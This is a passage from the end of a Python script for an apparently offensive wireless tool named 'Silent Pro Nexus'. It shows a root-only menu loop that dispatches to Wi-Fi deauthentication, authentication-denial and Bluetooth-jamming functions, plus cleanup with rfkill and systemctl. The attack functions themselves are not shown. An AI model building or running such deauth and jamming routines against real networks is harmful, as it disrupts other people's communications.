        print(f"{Colors.BOLD}{Colors.BB}  ╚══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        print()

    def run(self):
        while True:
            self.show_main_menu()
            choice = input(f"{Colors.CYAN}Enter your choice [00-13]: {Colors.RESET}").strip()

            if choice == "01": self.cmd_restart_services()
            elif choice == "02": self.cmd_scan_wifi()
            elif choice == "03": self.cmd_scan_bluetooth()
            elif choice == "04": self.cmd_deauth_single()
            elif choice == "05": self.cmd_deauth_mega()
            elif choice == "06": self.cmd_deauth_all()
            elif choice == "07": self.cmd_multi_target()
            elif choice == "08": self.cmd_auth_denial()
            elif choice == "09": self.cmd_bluetooth_jam()
            elif choice == "10": self.cmd_bluetooth_scan_and_jam()
            elif choice == "11": self.cmd_install_deps()
            elif choice == "12": self.cmd_stop_all()
            elif choice == "13": self.cmd_about()
            elif choice == "00":
                NexusUI.section("👋 EXITING SILENT PRO NEXUS")
                SystemManager.restart_network_manager()
                SystemManager.restart_bluetooth()
                subprocess.run("rfkill unblock all", shell=True, capture_output=True)
                NexusUI.success("System restored cleanly — Goodbye! 🚀")
                sys.exit(0)
            else:
                NexusUI.error(f"Invalid choice: '{choice}' — Please select 00-13")
                time.sleep(1.5)


# ═══════════════════════════════════════════════════════════════════════════
# 🚀 ENTRY POINT — START!
# ═══════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    try:
        app = SilentProNexus()
        SystemManager.check_os()
        SystemManager.require_root()
        SystemManager.full_system_diagnostic()
        app.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ Interrupted by user — Exiting safely...{Colors.RESET}")
        subprocess.run("rfkill unblock all", shell=True, capture_output=True)
        subprocess.run("systemctl restart NetworkManager", shell=True, capture_output=True)
        subprocess.run("systemctl restart bluetooth", shell=True, capture_output=True)
        print(f"{Colors.GREEN}✓ System restored — Goodbye!{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}✗ FATAL ERROR: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
